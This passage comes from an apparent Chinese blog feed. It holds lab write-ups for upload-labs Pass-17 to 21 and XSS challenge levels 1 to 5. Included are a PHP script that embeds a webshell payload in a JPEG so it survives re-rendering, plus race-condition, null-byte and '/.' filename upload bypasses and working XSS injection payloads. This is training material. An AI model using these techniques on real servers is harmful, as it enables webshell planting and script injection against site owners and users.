class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：</p><ul><li>准备一个jpg文件，上传到服务器然后再下载经过二次渲染后的图片到本地保存为1.jpg</li><li>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></li><li>上传图片马</li></ul><p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p></li></ol></li></ul><h3 id="18-Pass-18（条件竞争）"><a href="#18-Pass-18（条件竞争）" class="headerlink" title="18. Pass-18（条件竞争）"></a>18. Pass-18（条件竞争）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，发现它是先通过move_uploaded_file函数把文件临时存储之后再进行后缀名比对，比对成功后就执行rename函数对路径和文件名重命名。这里就存在条件竞争。条件竞争：简单来说，就是因为服务器是并行的，对于临时保存的文件，在这个文件被删除之前，如果同步制约没做好，文件没有上进程锁，那么其他的进程就可能在它被删除前对它进行操作。</p></li><li><p>绕过：<br>可以上传一个2.php（里面是phpinfo()函数），服务器会先将它临时存储，然后判断后缀，不对才会删除，在这个极为短暂的过程，我们有机会可以访问到这个临时保存的php文件。上传时用burp抓包，发送到burp的intruder模块，因为我们只需要重复不停的上传，所以payload type选择Null payload即可，然后把次数设定一个比较大的数（比如5000），然后options中的进程数设多一点（比如50）。然后访问这个文件<code>http://192.168.183.133/upload-labs-master/upload/2.php</code>，进行抓包，送到intrud模块，同样设定5000次，进程设为50，然后两个爆破同时启动，就可以看到那个访问操作有小概率成功。因为是小概率，不成功可以多试几次。实在不能成功，可将文件名改成2.jpg，这样那个后缀判断会成功，然后会执行重命名，这样，那个临时文件存在的时间会稍微更长一点，我们可以通过靶场的文件执行漏洞访问<code>http://192.168.183.133/upload-labs-master/include.php?file=upload/2.jpg</code>，一样可以执行phpinfo函数，这个成功的概率要大得多。</p></li></ul><h3 id="19-Pass-19（条件竞争）"><a href="#19-Pass-19（条件竞争）" class="headerlink" title="19. Pass-19（条件竞争）"></a>19. Pass-19（条件竞争）</h3><ul><li><p>分析：<br>代码很长，这里只截取关键的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">   <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">   &#125;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// check if we need to rename the file</span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">     $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">     <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里和上一题一样，都是先存储，再重命名，一样存在条件竞争。</p></li><li><p>绕过：<br>参照上一题的绕过方法。</p></li></ul><h3 id="20-Pass-20（move-uploaded-file的-绕过）"><a href="#20-Pass-20（move-uploaded-file的-绕过）" class="headerlink" title="20. Pass-20（move_uploaded_file的/.绕过）"></a>20. Pass-20（move_uploaded_file的<code>/.</code>绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pathinfo($file_name,PATHINFO_EXTENSION)返回的是文件的后缀名，可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断<code>save_name=1.php%00.jpg</code>绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。这里的考点是:move_uploaded_file会忽略掉文件末尾<code>/.</code>所以可以构造<code>save_name=1.php/.</code>,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的<code>/.</code>可以实现保存文件为.php</p></li><li><p>绕过：</p><ol><li><code>save_name=1.php%00.jpg</code>00截断</li><li><code>save_name=1.php/.</code>move_uploaded_file的<code>/.</code>忽略</li></ol></li></ul><h3 id="21-Pass-21（数组-绕过）"><a href="#21-Pass-21（数组-绕过）" class="headerlink" title="21. Pass-21（数组/.绕过）"></a>21. Pass-21（数组/.绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，首先判断了type是不是<code>image/jpeg,image/png,image/gif</code>，通过之后，会判断文件名是不是数组，不是的话explode函数会将文件名字符串按照<code>.</code>分割成数组，然后取数组的最后一位进行后缀名判断，通过后，reset()函数会将数组的第一位输出并把首位指针移到下一位，此时<code>$file[count($file) - 1]</code>其实就等于<code>end($file)</code>即数组中存储的后缀名，然后再拼接成一个完整的文件名，然后存储。</p></li><li><p>绕过：<br>这样的话，我们上传1.php，然后将Content-type改成<code>image/jpeg,image/png,image/gif</code>中的一个，然后将<code>save_name</code>按照字符串存储，而不是原来的字符串，save_name[0]=1.php/，save_name[2]=jpg。这样的话，因为本来就是数组，所以可以跳过不执行explode函数，然后save_name[2]帮我们通过后缀白名单检测，然后拼接时，因为save_name[1]为空，所以拼接后的文件名为<code>1.php/.</code>，然后就是上一题的move_uploaded_file的<code>/.</code>忽略漏洞了，就可以成功上传。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss挑战靶场测试</title>
      <link href="/2020/03/08/xss%E6%8C%91%E6%88%98%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/03/08/xss%E6%8C%91%E6%88%98%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>XSS挑战靶场的write up</p><a id="more"></a><h1 id="XSS挑战靶场测试-未完"><a href="#XSS挑战靶场测试-未完" class="headerlink" title="- XSS挑战靶场测试(未完)"></a>- XSS挑战靶场测试(未完)</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="- Level 1"></a>- Level 1</h2><p>第一关直接在url进行测试，url为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.133&#x2F;xss&#x2F;level1.php?name&#x3D;test</span><br></pre></td></tr></table></figure><p>直接构造下面的语句进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.133&#x2F;xss&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>发现没有任何过滤，直接弹窗成功</p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="- Level 2"></a>- Level 2</h2><p>在输入框里面输入 <code>&lt;script&gt;alert(2)&lt;/script&gt;</code> 进行测试，点击搜索发现它变成了搜索的值，查看网页源代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>输入的内容被 “ ” 变成了value的值，没有进行解析，所以构造下面的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(3)&lt;&#x2F;script&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>首先用 “ 闭合前面的value的值，用 &gt; 闭合input标签，中间是XSS代码，后面的 // 是注释，注释掉原本语句中的 “&gt;，以免造成语句错误。将构造好的payload输入，点击搜索，成功弹窗。</p><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="- Level 3"></a>- Level 3</h2><p>同样进行基本测试，然后查看网页源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(4)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现 &lt;&gt; 被html实体化了，那么就找绕过尖括号的方法，尝试input标签里面的一些可以xss的事件，发现onclick没有被过滤，然后构造payload，使原句变成下面这个样子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">' onclick='alert(1)' type='text </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">''</span> <span class="attr">onclick</span>=<span class="string">'alert(1)'</span> <span class="attr">type</span>=<span class="string">'text '</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前面的 ‘ 闭合value的那个 ‘ ，text后面的单引号就使用原句中的即可。点击搜索，输入框变为空，成功解析。然后我们点击一下输入框，成功弹窗。</p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="- Level 4"></a>- Level 4</h2><p>进行基本测试，查看源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"scriptalert(1)/script"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现同level3一样是对 &lt;&gt; 进行了处理，只不过这次是直接删除，那么可以采取同level3一样的payload，只不过要做一点小修改，因为这里的value使用的是双引号。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">" onclick='alert(1)' type="text</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">'alert(1)'</span> <span class="attr">type</span>=<span class="string">"text "</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击搜索，输入框变为空，说明代码成功解析。然后点击一下输入框，成功弹窗。</p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="- Level 5"></a>- Level 5</h2><p>进行基本测试，查看源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;scr_ipt&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现第一个script被过滤了，那么尝试大小写绕过，没变化，应该是强制转化为小写再过滤，那放弃script标签，尝试onclick，一样被过滤，因为没有过滤 &lt;&gt; ，所以可以尝试其他标签，这里尝试使用超链接 href </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(6)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">""</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(7)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //"&gt;</span><br></pre></td></tr></table></figure><p>代码成功被解析，输入框右边的xss即可弹窗</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="- Level 6"></a>- Level 